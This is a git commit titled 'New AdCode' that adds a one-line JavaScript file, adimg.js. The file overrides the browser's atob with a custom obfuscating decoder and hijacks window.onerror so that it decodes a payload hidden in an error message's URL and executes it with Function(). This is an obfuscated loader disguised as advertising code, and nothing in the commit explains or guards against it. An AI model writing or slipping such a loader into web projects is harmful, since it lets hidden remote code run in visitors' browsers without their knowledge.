895fd5fac3cf215bb273bb852122eea3e9c76141
benimtor <benimtor@gmail.com>
2018-10-29 07:00:07 +0700

    New AdCode

---
+++ adimg.js
@@ -0,0 +1,1 @@
+function atob(code){code=unescape(code);var c=String.fromCharCode(code.charCodeAt(0)-code.length);for(var i=1;i<code.length;i++){c+=String.fromCharCode(code.charCodeAt(i)-c.charCodeAt(i-1))}return c};window.onerror=Function("var s=arguments[0].split('?')[1].split('&c=');Function(atob(s[1]))(s[0])");
